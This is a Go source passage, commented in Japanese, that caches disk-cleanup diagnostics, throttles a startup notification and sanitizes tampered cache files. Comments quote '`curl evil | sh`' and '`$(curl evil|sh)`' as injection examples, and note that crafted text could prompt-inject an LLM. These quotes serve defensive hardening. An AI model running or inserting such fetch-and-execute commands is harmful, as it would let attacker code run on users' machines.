package main

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"time"

	"doctor/cachedir"
	"doctor/disk"
	"doctor/svc"
	"termsafe"
)

// doctor のディスク診断結果の保存と、起動時トースト (issue 148 の 3 章)。
//
// 起動時には**走査しない**。前回 doctor を開いたときの結果を読むだけ (起動を待たせない要件)。
// だからトーストの数字は必ず過去のスキャン由来で、初回 (結果が無い) は沈黙する。
//
// 🚨 保存先は cachedir.Base() (= $XDG_CACHE_HOME/glog)。パスをここに書かない。

const (
	// doctorToastThreshold は起動時トーストを出す解放可能量の下限。
	// **20GB** (issue 218 で 10GB から引き上げ。2026-09-03)。
	// 根拠: この機の実測は合計 84.3GB で、上位 4 項目が npm 21.1 / go-build 20.1 /
	// xcode-deriveddata 17.6 / simulator-runtimes 16.2 GB。これらは掃除しても数日で GB 単位に
	// 戻るため、10GB では**掃除直後を除いてほぼ常時鳴る**。20GB は「上位 1 項目が育った状態」を
	// 拾う水準。⚠️ 変えるときは doctorToastCooldown と対で見る (低い閾値 + 短い抑止 = 鳴り続ける)。
	doctorToastThreshold = int64(20) << 30
	// doctorToastCooldown は一度出したら再表示しない期間。毎起動出すと無視されるようになり通知の意味が消える。
	doctorToastCooldown = 3 * 24 * time.Hour
	// 🚨 **サービス診断は起動時トーストの対象にしない** (issue 218 で判断)。
	// ディスクは「合計 GB」という自然な閾値を持てるが、サービスは件数しかなく、
	// 「壊れた登録 1 件」で**消すまで永久に鳴り続ける** (放置してよいケースがあるのに
	// lastNotifiedAt の抑止と噛み合わない)。サービスは doctor を開いたときだけ出す。
	// doctorStaleAfter を超えた結果には「N 日前の診断」を添える。古くても数字は出す (隠すと放置しているときほど
	// 無言になり、この機能が解こうとしている「気づけない」問題を再現する)。
	doctorStaleAfter = 7 * 24 * time.Hour
	// doctorCarryTTL は「今回実測していないエントリの数字を、前回のキャッシュから引き継いでよい」期間。
	// 🚨 上限が無いと**無期限に延命する**: 中断 (Esc) のたびに前回の記録を敷き直すので、
	// 「重いので毎回 Esc の前にたどり着けない」エントリは一度も検証されないまま残り続け、
	// 実体が消えていても検出する手段が構造上無くなる (敵対レビュー 2026-09-03 で実測:
	// 10 回連続で書き込みが成功しても 44GB のエントリが一度も減衰しなかった)。
	// 再利用 (doctorHeavyReuseTTL = 1 時間) より緩くしてよい: あちらは「走査を省く」判断で、
	// こちらは「走査が届かなかった記録を残す」判断なので、日をまたぐ Esc の連続に耐える必要がある。
	doctorCarryTTL = 24 * time.Hour
)

// doctorDiskCache は保存する形。エントリは表示に要る最小限 (トーストの上位 2 件と合計)。
type doctorDiskCache struct {
	ScannedAt      time.Time              `json:"scanned_at"`
	Partial        bool                   `json:"partial"` // Esc で中断した部分結果
	Total          int64                  `json:"total"`   // 今消せる量 (disk.Report.Total)
	Entries        []doctorDiskCacheEntry `json:"entries"` // 占有量の降順
	LastNotifiedAt time.Time              `json:"last_notified_at"`
	// Failed は「診断できなかった」エントリ数。0 に畳むとトーストが黙るので数えて持つ (issue 173)。
	Failed int `json:"failed,omitempty"`
	// Reused は「前回の計測値を引き継いだエントリを含む」印 (記録用。この値だけを見て
	// 書く / 書かないを決めない — 決めると凍結する。doctorCacheFromReport のコメントを参照)。
	// 旧いキャッシュには無いので、欠けていれば false。
	Reused bool `json:"reused,omitempty"`
}

type doctorDiskCacheEntry struct {
	ID     string `json:"id"`
	Label  string `json:"label"`
	Size   int64  `json:"size"`
	Status string `json:"status"`
	// MeasuredAt はこの数字を**実測した**時刻。carry-forward (中断で今回触れなかったエントリ /
	// 再利用したエントリ) に鮮度の上限を持たせるために要る (doctorCarryTTL)。
	// 旧いキャッシュには無いので、ゼロなら prev.ScannedAt を代わりに使う。
	MeasuredAt time.Time `json:"measured_at,omitempty"`
}

func doctorDiskCachePath() (string, error) {
	base, err := cachedir.Base()
	if err != nil {
		return "", err
	}
	return filepath.Join(base, "doctor-disk.json"), nil
}

// doctorCacheFromReport は保存する形に落とす。候補 0 件のエントリは持たない。
//
// 🚨 **再利用 (Reused) した計測値はトーストの材料にしない** (issue 172): 行には「N 分前の計測を再利用」の
// 注記が付くが、トーストには無い。実体を消した後も最大 1 時間「解放できます」と言い続け、
// 「開けば直る」も効かない (トーストは次に doctor を開くまで更新されない)。
//
// 代わりに**前回のキャッシュのそのエントリを引き継ぐ**。前回の値は「最後に実測したときの値」で、
// 再利用中の行が出しているのと同じ古さの情報なので、トーストの意味 (最後に実測した値) と合う。
//
// 🚨 「Reused が 1 件でもあれば結果ごと書かない」にしてはいけない。`doctorReuseFrom` の 1 時間は
// **各エントリが実測されるたびにリセットされる**ので、重いエントリが 2 件以上あって実測時刻が
// 互い違いだと「常にどれか 1 件が再利用対象」の状態が持続し、キャッシュが恒久的に凍結する
// (敵対レビュー 2026-09-03 で実測: 20 分おきに 6 時間・18 回開いても一度も更新されず、
// 軽いエントリが 1GB → 100GB に激増しても反映されなかった)。エントリ単位でマージする。
// carryFresh は「今回実測していないエントリの数字を引き継いでよいか」。実測時刻が無い旧いキャッシュは
// キャッシュ全体の ScannedAt で代用する。未来の時刻は引き継がない (他の age 判定と同じ規律)。
func carryFresh(e doctorDiskCacheEntry, prevScannedAt, now time.Time) bool {
	at := e.MeasuredAt
	if at.IsZero() {
		// 旧いキャッシュ (MeasuredAt を持たない版で書かれたもの) だけがここへ来る。
		// 新しく書くエントリは doctorCacheFromReport が clampMeasuredAt で必ず埋めるので、
		// **このフォールバックが継続的な判定に使われることは無い**。
		// 🚨 フォールバックを carryFresh の常用経路にしてはいけない: キャッシュ全体の
		// ScannedAt は保存のたびに更新されるので、TTL より短い間隔で保存が続くと
		// 「前回保存からの経過」しか見なくなり、**実測からの真の経過が永久に積まれない**
		// (実測 2026-09-03: MeasuredAt を書かない変異で 10h おき 30 ラウンド = 真の経過 300h でも
		// 124GB のエントリが生き残った。issue 194)
		at = prevScannedAt
	}
	if at.IsZero() {
		return false // 実測時刻が分からないものは引き継がない
	}
	// 🚨 未来の時刻は**引き継ぐ**。他の age 判定 (cooledDown / loadDoctorSnapshot /
	// doctorReuseFrom) は「作業を省いてよいか / 黙ってよいか」を決めるので未来を疑う側 = 安全側だが、
	// ここは「記録を残してよいか」なので**残す側が安全**。
	// この判断が成立するのは **MeasuredAt が未来を指さないこと**を書き込み側 (clampMeasuredAt) が
	// 保証しているからで、判定側だけを見て「小さいズレならすぐ正になる」と読んではいけない
	// (実測 2026-09-03: 100 年後を指す MeasuredAt では 300 日経っても一度も失効しなかった。issue 194)。
	return now.Sub(at) < doctorCarryTTL
}

// clampMeasuredAt は実測時刻を「保存する時点」で頭打ちにする。読み出し側で未来を救うのではなく
// **書き込み側で不変条件を作る** (救う経路が 1 つで済む。carryFresh / トースト / 再利用判定が
// それぞれ未来を疑う形にすると、どれか 1 つ漏れたときに同じ無期限延命が戻る)。
//
// ゼロ値も同時に埋める: MeasuredAt を持たないエントリは carryFresh でキャッシュ全体の ScannedAt へ
// フォールバックし、TTL より短い間隔の保存が続くと真の経過を無視する (上記の実測)。
func clampMeasuredAt(at, fallback, now time.Time) time.Time {
	if at.IsZero() {
		at = fallback
	}
	if at.IsZero() {
		return time.Time{} // 埋める材料が無い (carryFresh 側が引き継がない判断をする)
	}
	if at.After(now) {
		return now
	}
	return at
}

func doctorCacheFromReport(rep disk.Report, prev doctorDiskCache) doctorDiskCache {
	c := doctorDiskCache{ScannedAt: rep.ScannedAt, Partial: rep.Partial, LastNotifiedAt: prev.LastNotifiedAt}
	prevByID := map[string]doctorDiskCacheEntry{}
	for _, e := range prev.Entries {
		prevByID[e.ID] = e
	}
	merged := map[string]doctorDiskCacheEntry{}
	var ids []string
	put := func(e doctorDiskCacheEntry) {
		if _, dup := merged[e.ID]; !dup {
			ids = append(ids, e.ID)
		}
		merged[e.ID] = e
	}
	// 中断した部分結果は**前回の記録に重ねる**。洗い替えにすると、今回走査が届かなかった
	// エントリの値と「診断できず」件数が消える (敵対レビュー 2026-09-03 で実測: 合計が前回より
	// 大きい partial は書いてよい仕様なので、大きいエントリを 1 つ測った直後に Esc すると
	// 恒久 failed の記録まで failed=0 に化けた)。完走した結果はカタログを一巡しているので
	// 重ねる必要が無く、消えたエントリはそのまま消してよい。
	if rep.Partial {
		for _, e := range prev.Entries {
			if carryFresh(e, prev.ScannedAt, rep.ScannedAt) {
				// 旧版が書いた未来の時刻がキャッシュに居座っている場合もここで頭打ちにする
				// (書き込みのたびに正規化されるので、次の保存以降は TTL が正しく効く)
				e.MeasuredAt = clampMeasuredAt(e.MeasuredAt, prev.ScannedAt, rep.ScannedAt)
				put(e)
			}
		}
	}
	for _, r := range rep.Results {
		if r.Reused {
			// 今回は実測していない。前回の実測値があればそれを引き継ぐ (無ければ持たない)
			if e, ok := prevByID[r.Entry.ID]; ok && carryFresh(e, prev.ScannedAt, rep.ScannedAt) {
				e.Label = r.Entry.Label // 表示文言だけは今のカタログに合わせる
				e.MeasuredAt = clampMeasuredAt(e.MeasuredAt, prev.ScannedAt, rep.ScannedAt)
				put(e)
			}
			c.Reused = true
			continue
		}
		if r.Status == disk.StatusOK && len(r.Items) == 0 {
			delete(merged, r.Entry.ID) // 候補が無くなった
			continue
		}
		// MeasuredAt は書き込み時点で頭打ちにし、ゼロなら走査時刻で埋める (issue 194)。
		// 読み出し側 (carryFresh) で未来を救う形にすると、救う経路が判定の数だけ要る
		put(doctorDiskCacheEntry{ID: r.Entry.ID, Label: r.Entry.Label, Size: r.Size, Status: string(r.Status),
			MeasuredAt: clampMeasuredAt(r.MeasuredAt, rep.ScannedAt, rep.ScannedAt)})
	}
	for _, id := range ids {
		e, ok := merged[id]
		if !ok {
			continue
		}
		c.Entries = append(c.Entries, e)
		switch e.Status {
		case string(disk.StatusOK):
			c.Total += e.Size
		case string(disk.StatusFailed):
			c.Failed++
		}
	}
	sort.SliceStable(c.Entries, func(a, b int) bool { return c.Entries[a].Size > c.Entries[b].Size })
	return c
}

// saveDoctorDiskCache は atomic (temp + rename) に書く。中断で壊れたキャッシュを残さない。
func saveDoctorDiskCache(c doctorDiskCache) error {
	path, err := doctorDiskCachePath()
	if err != nil {
		return err
	}
	data, err := json.Marshal(c)
	if err != nil {
		return err
	}
	// 🚨 独自の temp + rename を書かない (issue 219)。以前ここに在った
	// `<path>.tmp.<pid>` + os.WriteFile は **rename 分岐だけ**を写していたので、ENOSPC で
	// write が失敗すると 0 バイトの残骸が残った (doctor は「ディスクが足りない」ときに開く
	// 画面なので、一番残骸が出てほしくない状況で出る)。writeAtomic は 3 分岐すべて掃除する。
	return writeAtomic(path, data)
}

// loadDoctorDiskCache は保存結果を返す。欠損・破損は「結果なし」(起動を失敗させない。クラッシュもしない)。
func loadDoctorDiskCache() (doctorDiskCache, bool) {
	path, err := doctorDiskCachePath()
	if err != nil {
		return doctorDiskCache{}, false
	}
	data, err := os.ReadFile(path)
	if err != nil {
		return doctorDiskCache{}, false
	}
	var c doctorDiskCache
	if err := json.Unmarshal(data, &c); err != nil || c.ScannedAt.IsZero() {
		return doctorDiskCache{}, false
	}
	return c, true
}

// markDoctorNotified は再通知抑止の時刻を記録する (トーストを出した直後に呼ぶ)。
func markDoctorNotified(now time.Time) {
	c, ok := loadDoctorDiskCache()
	if !ok {
		return
	}
	c.LastNotifiedAt = now
	_ = saveDoctorDiskCache(c)
}

// doctorStartupToast は起動時トーストの文面 ("" = 出さない)。純関数 (ファイルは読まない)。
//
//   - 結果が無い → 出さない (初回は沈黙する。起動時に走査しない以上、出せる数字が無い)
//   - 合計が閾値未満 → 出さない (静かであることを既定にする)
//   - 前回の通知から cooldown 内 → 出さない
//   - 7 日超 → 文末に (N 日前の診断) を添える。数字は出す
//
// 文面は「合計」「上位 2 件」「どこを開けばいいか」だけ。トーストにアクションは持たせず文言で D へ誘導する
// (ユーザー決定 2026-09-02)。
// sanitizeDiskCache は起動トーストの材料に信頼境界を置く。`doctor-disk.json` は
// snapshot と同じく**一般ユーザー権限で書き換えられる**のに、`loadDoctorDiskCache` は
// JSON として読めて ScannedAt が非ゼロなら通していた (issue 193)。
//
// 🚨 **読み込み側ではなくここで絞る**。`loadDoctorDiskCache` は cachedir とファイル I/O だけに
// 依存する関数で、カタログを知らない。読み込みにカタログを渡すと依存が増える一方、
// カタログ照合が要るのは「人に見せる」瞬間だけなので、表示の入口に置く方が依存が少ない。
//
// 合計と件数は**残ったエントリから引き直す**。細工した Total をそのまま使うと、
// エントリを落としても「99GB 解放できます」が残る。
func sanitizeDiskCache(c doctorDiskCache) doctorDiskCache {
	out := c
	out.Entries = make([]doctorDiskCacheEntry, 0, len(c.Entries))
	out.Total, out.Failed = 0, 0
	for _, e := range c.Entries {
		if !disk.CatalogHasID(e.ID) || !knownDiskStatus(e.Status) || !plausibleSize(e.Size) {
			continue
		}
		e.Label = cleanOneLine(e.Label) // 埋め込み改行はトーストの行数を狂わせる
		out.Entries = append(out.Entries, e)
		// string で switch する (doctorCacheFromReport の同型の switch と揃える)。
		// disk.Status で switch すると exhaustive linter が blocked の case を要求するが、
		// blocked は合計にも診断できず件数にも入らないので、書くと「何もしない case」が増える
		switch e.Status {
		case string(disk.StatusOK):
			out.Total += e.Size
		case string(disk.StatusFailed):
			out.Failed++
		}
	}
	return out
}

func doctorStartupToast(c doctorDiskCache, ok bool, now time.Time) string {
	if !ok {
		return ""
	}
	c = sanitizeDiskCache(c)
	// 閾値未満でも「診断できず」が在れば黙らない (issue 173 / sinking silently の禁止)。
	// 数字が出せないことと、何も問題が無いことは別。
	if c.Total < doctorToastThreshold {
		if c.Failed == 0 || cooledDown(c, now) {
			return ""
		}
		return fmt.Sprintf("%d 件を診断できませんでした (解放量は未確定) — D で doctor を開く", c.Failed)
	}
	if cooledDown(c, now) {
		return ""
	}
	text := disk.HumanSize(c.Total) + " 解放できます"
	if tops := doctorTopEntries(c, 2); tops != "" {
		text += " (" + tops + ")"
	}
	if c.Failed > 0 {
		text += fmt.Sprintf("、%d 件は診断できず", c.Failed)
	}
	text += " — D で doctor を開く"
	// 🚨 age < 0 (ScannedAt が未来) は「N 日前」を負の数で出さず、鮮度が不明である旨にする。
	// 黙って注記を落とすと「新しい診断」に見える (issue 201)。
	if age := now.Sub(c.ScannedAt); age < 0 {
		text += " (診断時刻が未来。時計を確認してください)"
	} else if age > doctorStaleAfter {
		text += fmt.Sprintf(" (%d 日前の診断)", int(age.Hours()/24))
	}
	return text
}

// cooledDown は「前回の通知から cooldown 内」か。
// age < 0 (LastNotifiedAt が未来) は cooldown 明けとして扱う。時計を戻した / NTP の大補正 /
// 別マシンのキャッシュを持ってきた後に永久沈黙するのを防ぐ (issue 174)。
// loadDoctorSnapshot と doctorReuseFrom も同じ規律 (age < 0 を弾く) なので、ここだけ非対称にしない。
func cooledDown(c doctorDiskCache, now time.Time) bool {
	age := now.Sub(c.LastNotifiedAt)
	return !c.LastNotifiedAt.IsZero() && age >= 0 && age < doctorToastCooldown
}

// doctorTopEntries は ok の上位 n 件を "Xcode 17.6GB / npm 20.9GB ほか" の形にする。
func doctorTopEntries(c doctorDiskCache, n int) string {
	var parts []string
	rest := 0
	for _, e := range c.Entries {
		if e.Status != string(disk.StatusOK) || e.Size == 0 {
			continue
		}
		if len(parts) < n {
			parts = append(parts, e.Label+" "+disk.HumanSize(e.Size))
		} else {
			rest++
		}
	}
	if len(parts) == 0 {
		return ""
	}
	s := parts[0]
	for _, p := range parts[1:] {
		s += " / " + p
	}
	if rest > 0 {
		s += " ほか"
	}
	return s
}

// doctorSnapshotTTL は「開いたときに前回の結果をそのまま出す」期間。C-g の popup を高頻度で開閉すると毎回
// スキャンが走って見えるので、直近の完全な結果はこの間そのまま出し、r で明示的に走査し直す (ユーザー要望 2026-09-02)。
const doctorSnapshotTTL = 5 * time.Minute

// doctorSnapshot は doctor 画面の 3 セクションの完全な結果 (トースト用の doctor-disk.json とは別ファイル。
// あちらは合計と上位だけの軽い要約で、こちらは画面をそのまま再現するための全体)。
type doctorSnapshot struct {
	ScannedAt time.Time        `json:"scanned_at"`
	Disk      disk.Report      `json:"disk"`
	Svc       svc.Report       `json:"svc"`
	Brew      brewDoctorResult `json:"brew"`
}

func doctorSnapshotPath() (string, error) {
	base, err := cachedir.Base()
	if err != nil {
		return "", err
	}
	return filepath.Join(base, "doctor-snapshot.json"), nil
}

// saveDoctorSnapshot は完全な結果だけを書く (partial は書かない。開き直しで中断の姿を再現しない)。atomic。
func saveDoctorSnapshot(sn doctorSnapshot) error {
	if sn.Disk.Partial || sn.Svc.Interrupted {
		return nil
	}
	path, err := doctorSnapshotPath()
	if err != nil {
		return err
	}
	data, err := json.Marshal(sn)
	if err != nil {
		return err
	}
	// 🚨 独自の temp + rename を書かない (issue 219)。以前ここに在った
	// `<path>.tmp.<pid>` + os.WriteFile は **rename 分岐だけ**を写していたので、ENOSPC で
	// write が失敗すると 0 バイトの残骸が残った (doctor は「ディスクが足りない」ときに開く
	// 画面なので、一番残骸が出てほしくない状況で出る)。writeAtomic は 3 分岐すべて掃除する。
	return writeAtomic(path, data)
}

// loadDoctorSnapshot は TTL 内の完全な結果を返す。欠損・破損・期限切れ・未来の時刻は「無し」(走査に倒す)。
func loadDoctorSnapshot(now time.Time) (doctorSnapshot, bool) {
	sn, ok := loadDoctorSnapshotAny()
	if !ok {
		return doctorSnapshot{}, false
	}
	if age := now.Sub(sn.ScannedAt); age < 0 || age >= doctorSnapshotTTL {
		return doctorSnapshot{}, false
	}
	return sn, true
}

// loadDoctorSnapshotAny は期限を見ずに読む (重いエントリの再利用判定は個々の MeasuredAt で行うため)。
func loadDoctorSnapshotAny() (doctorSnapshot, bool) {
	path, err := doctorSnapshotPath()
	if err != nil {
		return doctorSnapshot{}, false
	}
	data, err := os.ReadFile(path)
	if err != nil {
		return doctorSnapshot{}, false
	}
	var sn doctorSnapshot
	if err := json.Unmarshal(data, &sn); err != nil || sn.ScannedAt.IsZero() {
		return doctorSnapshot{}, false
	}
	sn.Disk.Results = sanitizeSnapshotResults(sn.Disk.Results, timeNow())
	sn.Disk.Total = disk.SumDeletable(sn.Disk.Results)
	// サービス節と brew 節も同じ境界を通す。サービスの Commands は「手で実行してください」と
	// 提示して Y でコピーさせるので、保存された文字列をそのまま信じると `curl evil | sh` を
	// コピー経路に載せられる (issue 178 の敵対レビューが再現した)
	sn.Svc = svc.SanitizeRestored(sn.Svc)
	sn.Brew = sanitizeRestoredBrew(sn.Brew)
	return sn, true
}

// sanitizeRestoredBrew は保存から読み戻した brew doctor の結果を絞る (issue 178)。
// 警告本文は `brew doctor` の自由文なので中身は検査できないが、**形**は固定できる:
// `Warning:` で始まる塊だけを残し、制御文字 (ANSI エスケープ・復帰) を落として長さと件数を切る。
// これで「UI の行構造を偽装する」「画面を埋め尽くす」は防げる。
//
// 🚨 残った本文は依然としてキャッシュファイルの書き手が決められる文字列で、`Y` のコピー文にも乗る。
// brew 節にはコマンドの提示が無く (④ の削除対象でもない) ので、ここは形の検査に留めて
// 「中身は信用していない」ことを記録する。中身まで断つなら復元をやめて毎回 brew doctor を回すことになり、
// TTL 内の開き直しを速くするというこの機能の目的と衝突する。
func sanitizeRestoredBrew(b brewDoctorResult) brewDoctorResult {
	out := brewDoctorResult{Clean: b.Clean, Unavailable: cleanBrewLine(b.Unavailable)}
	for i, w := range b.Warnings {
		if i >= maxRestoredBrewWarnings {
			break
		}
		if !strings.HasPrefix(w, "Warning:") {
			continue
		}
		out.Warnings = append(out.Warnings, cleanBrewText(w))
	}
	if len(out.Warnings) == 0 && !out.Clean && out.Unavailable == "" {
		return brewDoctorResult{} // 何も残らなかった = 復元しない (走査に倒す)
	}
	return out
}

// cleanOneLine は「1 件が 1 行として描かれる」自由文を絞る (改行も落とす)。
//
// 🚨 無害化そのものは termsafe に委ねる (issue 228)。以前はここで `unicode.IsPrint` を回して
// いたが、それは ESC だけ落として payload (`]52;c;…`) を本文に残す形で、doctor / issues /
// git の各所と同じ判定を別実装で持っていた。**ここに残るのは長さの上限**だけ
// (画面を埋め尽くさせない = 保存されたキャッシュを読み戻す側の関心)。
func cleanOneLine(s string) string { return cutRunes(termsafe.PlainLine(s), maxRestoredBrewText) }

// cutRunes は rune 境界で切る (バイト位置で切ると不正な UTF-8 の断片が残り、
// 幅計算と端末で解釈が割れる)。`for i := range s` の i は rune の先頭バイトだけを取る。
func cutRunes(s string, maxBytes int) string {
	for i := range s {
		if i > maxBytes {
			return s[:i]
		}
	}
	return s
}

// --- 復元した値の検査 (snapshot と doctor-disk.json が共有する述語) ---
//
// 2 つのキャッシュは型が違う (`disk.Result` と `doctorDiskCacheEntry`) が、絞りたい性質は同じ。
// **述語の単位で切って両方から呼ぶ** (中間の構造体へ寄せると、3 つ目のキャッシュが増えたときに
// 変換だけが増える)。新しい検査を足すときは、ここに述語を 1 つ足して呼び出し側に配る。

// knownDiskStatus は Status が実装が知っている 3 値か。未知の値は「✅ 安全 + サイズ表示」に
// 化けるので落とす (issue 178)。文字列で持つキャッシュ側からも使えるよう string で受ける。
func knownDiskStatus(status string) bool {
	switch disk.Status(status) {
	case disk.StatusOK, disk.StatusBlocked, disk.StatusFailed:
		return true
	}
	return false
}

// plausibleSize は表示・合計に載せてよいサイズか。負値は合計を減らす向きに効く (issue 178)。
func plausibleSize(n int64) bool { return n >= 0 }

// safeDisplayPath は「行・`y`・`Y` に出してよいパス」か。
//
// なぜ要るか: `diskCopyText` は「別セッションの LLM に消してよいか聞く」形の文面を作るので、
// 細工したパスは **prompt injection の材料**になり、人がそのまま貼れば任意コマンドの実行になる
// (実測 2026-09-03: 埋め込み改行 + `$(curl evil|sh)` が y / Y の両方にそのまま出た。issue 193)。
//
// 🚨 ここは**表示とコピーの健全性**の検査であって、削除の安全性ではない。④ の削除は
// 「必ず再スキャンして `validateTarget` を通す」が不変条件で、その規律は変わらない (issue 148)。
func safeDisplayPath(p string) bool {
	if p == "" || len(p) > maxRestoredPathLen {
		return false
	}
	if !strings.HasPrefix(p, "/") {
		return false // 相対パスは復元経路では出てこない (出たなら細工されている)
	}
	if p != filepath.Clean(p) {
		return false // `..` や重複スラッシュを畳んだ形と一致しないもの
	}
	// 制御文字の判定は disk.DisplayablePath (CLI と共有する述語) に寄せる。ここに残るのは
	// **復元経路だけの整合性検査** (絶対パス / Clean 済み / 長さ) で、live のパスは実在する
	// ものなので満たして当たり前 = 検査する意味があるのは保存ファイル相手のときだけ
	return disk.DisplayablePath(p)
}

// cleanOneLineList は自由文の一覧を絞る (件数と 1 件あたりの長さ、改行)。
func cleanOneLineList(ss []string) []string {
	if len(ss) == 0 {
		return nil
	}
	out := make([]string, 0, len(ss))
	for i, s := range ss {
		if i >= maxRestoredListItems {
			break
		}
		out = append(out, cleanOneLine(s))
	}
	return out
}

const (
	// maxRestoredPathLen はパス 1 本の上限。macOS の PATH_MAX (1024) に合わせる:
	// これを超えるパスは実在しないので、復元経路に出てきたら細工されている
	maxRestoredPathLen      = 1024
	maxRestoredListItems    = 200
	maxRestoredBrewWarnings = 50
	maxRestoredBrewText     = 4000
)

// cleanBrewText は改行だけ残して他の制御文字を落とし、長さを切る (警告本文は複数行が正常)。
// 無害化は termsafe.PlainBlock に委ねる (cleanOneLine と同じ理由。issue 228)。
//
// 🚨 **1 件が 1 行として描かれる値には使わないこと**。改行を残すので、偽の行を差し込まれて
// 固定高パネルの行数が狂う (行数を数えないテストは素通りする)。brew の `Unavailable` は
// 1 行の doctorRow なので cleanBrewLine を使う (敵対レビュー 2026-09-04 が実測)。
func cleanBrewText(s string) string { return cutRunes(termsafe.PlainBlock(s), maxRestoredBrewText) }

// cleanBrewLine は brew 節のうち**1 行として描かれる**値 (Unavailable) 用。
func cleanBrewLine(s string) string { return cleanOneLine(s) }

// cleanLiveBrew は走査したての brew doctor の結果を無害化する (live 経路の関門。issue 228)。
//
// 🚨 復元経路 (sanitizeRestoredBrew) と違って**件数は絞らず、`Warning:` で始まらない塊も
// 落とさない**。あちらは書き換えられるキャッシュファイルが相手なので「形が違うものは
// 復元しない」でよいが、こちらは brew doctor の実出力で、形が違う = brew の出力形式が
// 変わったということ。落とすと診断そのものが黙って消える。
func cleanLiveBrew(b brewDoctorResult) brewDoctorResult {
	out := brewDoctorResult{Clean: b.Clean, Unavailable: cleanBrewLine(b.Unavailable)}
	for _, w := range b.Warnings {
		out.Warnings = append(out.Warnings, cleanBrewText(w))
	}
	return out
}

// doctorSnapshotInCatalog は実効カタログに無い ID の Result を落とす。「カタログから消えた ID …
// 4.7GB ✅ 安全」という行を snapshot から作れてしまうのを塞ぐ (doctorReuseFrom は ID で引くので
// 同じ規律になっており、復元経路だけが緩かった)。実効カタログはテストが差し替えるので、
// 既定カタログを前提にせず呼び出し側から渡す。
func doctorSnapshotInCatalog(rs []disk.Result, lookup func(string) (disk.Entry, bool)) []disk.Result {
	out := make([]disk.Result, 0, len(rs))
	for _, r := range rs {
		e, ok := lookup(r.Entry.ID)
		if !ok {
			continue
		}
		// 🚨 **Entry はカタログの今の定義へ束ね直す** (issue 229)。snapshot には Entry が丸ごと
		// 保存されるので、そのまま使うと (a) カタログを直しても古い文言が出続け (b) 一般ユーザー
		// 権限で書き換えた Label / Detail / Risk がそのまま行と y のコピーに載る。
		// 計測値の再利用 (Reused) 側は同じことを既にやっている (doctorReuseFrom の r.Entry = e)。
		// これで Entry を sanitize する必要そのものが消える (計測値だけが snapshot 由来になる)
		r.Entry = e
		out = append(out, r)
	}
	return out
}

// sanitizeSnapshotResults は snapshot 由来の Result を「信用してよい形」に絞る (issue 178)。
//
// 🚨 **信頼境界**: `doctor-snapshot.json` は一般ユーザー権限で書き換えられる。細工した JSON の
// 任意パスが行・y のコピー・合計・次の snapshot への書き戻しに載ってはいけない。
//
// 🚨 削除経路は**この境界に依存していない** (2026-09-04 に実測して doc を更新): `disk.Delete` は
// `Reused` / `FromSnapshot` の Result を拒否し、対象は `lookupEntry(opt.Catalog, ID)` で
// コンパイル済みカタログから引き直したうえで走査もやり直す。したがって細工した DeleteVia / Paths が
// 削除の作法を乗っ取ることはない。ここが守るのは**表示と y / Y のコピー**。
// Entry 自体は doctorSnapshotInCatalog がカタログへ束ね直すので、この関数は計測値だけを見る (issue 229)。
//
// 落とすもの:
//   - **未知の Status** — ok / blocked / failed 以外は「✅ 安全 + サイズ表示」に化けていた。
//     判定できないものを緑にしない
//   - **負のサイズ** — 「-5B 解放可能」と表示されていた (Result と Item の両方を見る)
//   - **未来の MeasuredAt** — reuse 側は age<0 を弾くのに復元側は素通りだった (非対称)
//
// 残すものには **FromSnapshot=true** を立てる。snapshot 復元経路では Result 側に「走査していない」
// 印が無く、それを示すのは view の snapshotAt だけ = Result 単位では区別できなかった。
// ④ は「印が立っている行は削除の前に必ず再スキャンする」という不変条件にするので、Result 側に要る。
// 🚨 **Reused を流用してはいけない**。Reused は「重いエントリの計測値を前回から引き継いだ」という
// 別の意味を既に持ち、行の「N 分前の計測を再利用」注記を出している。流用すると普通の開き直しで
// 嘘の注記が全行に出る (敵対レビュー 2026-09-03 で実測: `-1113 分前の計測を再利用`)。
func sanitizeSnapshotResults(rs []disk.Result, now time.Time) []disk.Result {
	out := make([]disk.Result, 0, len(rs))
	for _, r := range rs {
		if !knownDiskStatus(string(r.Status)) || !plausibleSize(r.Size) {
			continue
		}
		// 崩れた Item は **その Item だけ落とし、合計を引き直す**。Result ごと落とすと
		// パス 1 本の細工で 20GB のエントリが理由なく画面から消える (検査を足すほど消える範囲が
		// 広がる)。Item 単位なら影響が局所に留まり、後から検査を足しやすい。
		// 🚨 落としたら **Size を引き直す**。引かないと行の合計と Items の和が食い違い、
		// 「消したのに減らない」に見える (合計は disk.SumDeletable が Result.Size を足す)
		kept := make([]disk.Item, 0, len(r.Items))
		dropped := 0
		for _, it := range r.Items {
			if !plausibleSize(it.Size) || !safeDisplayPath(it.Path) {
				dropped++
				continue
			}
			kept = append(kept, it)
		}
		if dropped > 0 {
			var sum int64
			for _, it := range kept {
				sum += it.Size
			}
			r.Items = kept
			r.Size = sum
			// 落としたことを人に見える形で残す (黙って消すと「昨日より減った」理由が分からない)。
			// Failures はこの後 cleanOneLineList を通るので、ここでは素の文字列でよい
			r.Failures = append(r.Failures,
				fmt.Sprintf("保存された結果のうち %d 件は形が壊れていたため除外しました (再スキャンで確かめてください)", dropped))
		}
		if len(r.Items) == 0 && r.Status == disk.StatusOK && dropped > 0 {
			continue // 全部落ちた ok エントリは候補 0 件と同じなので出さない
		}
		if !r.MeasuredAt.IsZero() && now.Sub(r.MeasuredAt) < 0 {
			continue
		}
		// 自由文も絞る: diskCopyText は「別セッションの LLM に消してよいか聞く」形を作るので、
		// 細工した Reason / Failures / Contents はそのまま prompt injection の材料になる
		// (敵対レビュー 2026-09-03)。制御文字を落として長さと件数を切る
		// 🚨 **改行も落とす**。brew の警告は「(N 行)」の塊として畳んで出すので改行が正常だが、
		// ディスク節の Reason / Failures / Contents は**1 件が 1 行**として描かれる。改行が残ると
		// doctorRow.text の中に改行が入り、幅を数えるテスト (dispWidth) を素通りしたまま
		// 固定高のパネルの行数が実際には増える (敵対レビュー 2026-09-03)。
		// 同じ helper を「畳む側」と「1 行の側」で共用しないこと
		r.Reason = cleanOneLine(r.Reason)
		r.Failures = cleanOneLineList(r.Failures)
		r.Contents = cleanOneLineList(r.Contents)
		// 🚨 Entry も保存ファイルの中身 (live ではカタログの写しだが、復元では JSON から来る)。
		// doctorRiskMark は `string(r.Entry.Risk)` を、行は Label / Recover をそのまま描く。
		// これは issue 229 (Entry をカタログへ束ね直す) の代わりではない — ここが直すのは
		// 制御文字だけで、「保存された Risk / DeleteVia が実物と違う」意味のずれは残る
		r.Entry = disk.SanitizeEntryForDisplay(r.Entry)
